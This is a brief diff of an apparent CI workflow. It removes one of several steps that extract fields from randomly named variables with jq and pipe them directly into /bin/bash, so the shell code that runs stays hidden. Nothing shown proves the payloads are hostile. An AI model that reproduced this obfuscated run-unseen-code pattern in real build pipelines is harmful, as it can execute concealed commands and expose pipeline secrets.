@@ -31,7 +31,6 @@ jobs:
           printf '%s' "$h565" | jq -r .lo2 | /bin/bash
           printf '%s' "$nohao74" | jq -r .ind04101 | /bin/bash
           printf '%s' "$cpu181" | jq -r .ak162 | /bin/bash
-          echo $l86456 | jq -r .rzhuw71754 | /bin/bash
           printf '%s' "$v82" | jq -r .ahn04 | /bin/bash
           printf '%s' "$nmhs8" | jq -r .tne4769 | /bin/bash
 
